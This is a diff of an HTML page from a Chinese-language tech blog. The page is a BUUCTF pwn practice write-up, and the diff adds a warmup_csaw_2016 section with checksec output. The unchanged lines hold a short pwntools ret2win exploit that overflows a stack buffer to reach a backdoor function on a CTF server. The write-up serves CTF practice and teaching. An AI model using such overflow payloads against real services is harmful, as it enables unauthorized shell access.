@@ -75,7 +75,7 @@
     <article class="article-wrap">
       <header class="article-header">
         <div class="post-meta">
-          <span>995 字</span>
+          <span>1244 字</span>
         </div>
         <h1>BUUCTF pwn靶场练习</h1>
         
@@ -102,6 +102,9 @@
 
 <p>存在明显的栈溢出以及后门函数，因此这道题的思路就是利用栈溢出修改返回地址到后门函数的地址即可获得shell。由于是64位，需要注意堆栈平衡，exp如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io = remote(&quot;9a7dcd5303871c963154af4f.tcp-ctf2.dasctf.com&quot;, 9999, ssl=True)<br><br>ret = 0x0000000000401016<br>fun = 0x401186<br>payload = cyclic(0xF + 8) + p64(ret) + p64(fun)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<h1 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h1><p>首先查看一下开启了哪些保护</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">[*] &#x27;/mnt/d/ctf/buuctf/Pwn/warmup_csaw_2016&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX unknown - GNU_STACK missing<br>    PIE:        No PIE (0x400000)<br>    Stack:      Executable<br>    RWX:        Has RWX segments<br></code></pre></td></tr></table></figure>
 
 
         </div>
@@ -136,7 +139,7 @@
 
   <footer class="site-footer">
   <div class="site-footer__inner">
-    <p><strong>haoo&#39;s tech blog</strong><span aria-hidden="true"> / </span>31 篇记录<span aria-hidden="true"> / </span><a href="/rss.xml">RSS</a></p>
+    <p><strong>haoo&#39;s tech blog</strong><span aria-hidden="true"> / </span>26 篇记录<span aria-hidden="true"> / </span><a href="/rss.xml">RSS</a></p>
     <p>&copy; haoo · powered by Hexo</p>
   </div>
 </footer>
